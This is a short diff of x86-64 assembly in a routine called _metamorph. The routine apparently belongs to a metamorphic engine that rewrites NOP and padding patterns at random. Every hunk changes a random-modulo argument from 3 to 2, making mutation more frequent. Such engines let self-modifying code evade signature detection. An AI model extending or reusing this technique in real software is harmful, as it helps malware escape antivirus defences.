@@ -1467,7 +1467,7 @@ _metamorph:; (rdi -> ptr)
 			cmp word[rdi + 4], 0x9090
 			jne .inc_rcx
 			push rdi
-			mov rdi, 3
+			mov rdi, 2
 			call _rand_modulo
 			pop rdi
 			cmp rax, 0x0
@@ -1497,7 +1497,7 @@ _metamorph:; (rdi -> ptr)
 			cmp word[rdi + 4], 0x9090
 			jne .inc_rcx
 			push rdi
-			mov rdi, 3
+			mov rdi, 2
 			call _rand_modulo
 			pop rdi
 			cmp rax, 0x0
@@ -1526,7 +1526,7 @@ _metamorph:; (rdi -> ptr)
 			cmp byte[rdi + 5], 0x90
 			jne .inc_rcx
 			push rdi
-			mov rdi, 3
+			mov rdi, 2
 			call _rand_modulo
 			pop rdi
 			cmp rax, 0x0
@@ -1556,7 +1556,7 @@ _metamorph:; (rdi -> ptr)
 			cmp dword[rdi + 2], 0x00000000
 			jne .inc_rcx
 			push rdi
-			mov rdi, 3
+			mov rdi, 2
 			call _rand_modulo
 			pop rdi
 			cmp rax, 0x0
@@ -1588,7 +1588,7 @@ _metamorph:; (rdi -> ptr)
 			cmp byte[rdi + 4], 0x90
 			jne .inc_rcx
 			push rdi
-			mov rdi, 3
+			mov rdi, 2
 			call _rand_modulo
 			pop rdi
 			cmp rax, 0x0
@@ -1606,7 +1606,7 @@ _metamorph:; (rdi -> ptr)
 			cmp byte[rdi + 4], 0x00
 			jne .inc_rcx
 			push rdi
-			mov rdi, 3
+			mov rdi, 2
 			call _rand_modulo
 			pop rdi
 			cmp rax, 0x0
